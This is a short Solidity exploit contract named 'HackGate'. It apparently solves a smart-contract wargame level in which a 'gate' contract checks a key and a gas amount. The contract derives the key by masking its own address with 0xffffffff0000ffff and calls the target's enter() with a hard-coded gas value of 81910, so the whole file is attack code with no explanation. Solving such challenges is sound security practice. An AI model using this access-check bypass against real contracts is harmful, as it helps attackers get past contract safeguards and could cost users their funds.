pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IGate {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGate {
    function enter(address _gate) external payable {
        bytes8 _gateKey = bytes8(uint64((uint160(address(this)))));
        _gateKey = _gateKey & hex'ffffffff0000ffff';
        IGate(_gate).enter{gas: 81910}(_gateKey);
    }

    function a() public view returns (bytes8) {
        return bytes8(uint64((uint160(address(this)))));
    }

    function b() public view returns (bytes8) {
        bytes8 _gateKey = bytes8(uint64((uint160(address(this)))));
        _gateKey = _gateKey & hex'ffffffff0000ffff';
        return _gateKey;
    }
}